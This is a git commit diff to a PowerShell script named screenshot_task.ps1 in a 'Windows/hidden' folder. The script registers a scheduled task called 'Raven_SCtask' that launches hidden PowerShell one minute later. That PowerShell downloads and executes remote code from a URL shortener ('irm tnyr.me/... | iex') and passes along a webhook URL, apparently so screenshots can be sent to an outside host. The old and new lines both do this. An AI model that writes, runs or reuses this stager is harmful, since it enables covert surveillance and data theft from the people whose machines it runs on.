3f0c46a48c44d52b5e2a70a1ef5bf39fbcc02449
JoshuaBrien <joshuabrieno@gmail.com>
2025-05-31 16:12:12 +0800

    Update screenshot_task.ps1

--- Windows/hidden/screenshot_task.ps1
+++ Windows/hidden/screenshot_task.ps1
@@ -1,7 +1,7 @@
-$hookurl = $hookurl
-$taskAction = New-ScheduledTaskAction -Execute "conhost.exe" -Argument " --headless powershell -NoP -W H -C `$hookurl='$hookurl'; irm 'tnyr.me/G41CJDy6eh'  | iex"
+Write-output $hookurl
+$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W H -C  `$hookurl='$hookurl' irm tnyr.me/G41CJDy6eh  | iex"
 $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
 $taskRunAs = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME"
 $scheduledTask = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Principal $taskRunAs -Settings $settings 
-Register-ScheduledTask -TaskName "Raven_conhost_SCtask" -InputObject $scheduledTask -Force
+Register-ScheduledTask -TaskName "Raven_SCtask" -InputObject $scheduledTask -Force
